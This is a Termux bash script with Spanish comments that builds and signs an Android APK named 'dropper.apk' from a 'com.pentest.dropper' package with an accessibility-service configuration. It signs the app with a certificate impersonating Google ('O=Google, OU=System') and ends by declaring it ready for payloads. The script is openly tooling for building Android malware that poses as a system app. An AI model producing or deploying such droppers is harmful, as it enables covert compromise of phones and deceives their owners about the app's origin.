#!/data/data/com.termux/files/usr/bin/bash
set -e

echo "🔨 Compilando Dropper APK en Termux..."

# Dependencias
pkg install aapt dx openjdk-17 apksigner -y

# 1. Compilar Java
mkdir -p out
javac -d out/ -target 1.8 -source 1.8 \
  src/com/pentest/dropper/*.java

# 2. Empaquetar recursos
aapt2 compile res/xml/accessibility_config.xml -o res_compiled.xml
aapt2 link -o dropper-unsigned.apk \
  --manifest AndroidManifest.xml \
  --auto-add-overlay \
  -I $PREFIX/share/aapt/platforms/android-30/android.jar \
  -R res_compiled.xml

# 3. DEX
dx --dex --output=classes.dex out/
aapt2 add dropper-unsigned.apk classes.dex

# 4. Firmar
echo "password\npassword\npassword\npassword\nyes" | \
keytool -genkey -v -keystore release.keystore -alias shadowdeploy \
  -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password \
  -dname "CN=Android,OU=System,O=Google,L=Mountain View,ST=CA,C=US"

jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore release.keystore -storepass password \
  dropper-unsigned.apk shadowdeploy

apksigner sign --ks release.keystore --ks-key-alias shadowdeploy \
  --ks-pass pass:password --out dropper.apk dropper-unsigned.apk

# Cleanup
rm -rf out classes.dex dropper-unsigned.apk res_compiled.xml release.keystore

echo "✅ dropper.apk compilado! (Listo para payloads/)"
ls -la dropper.apk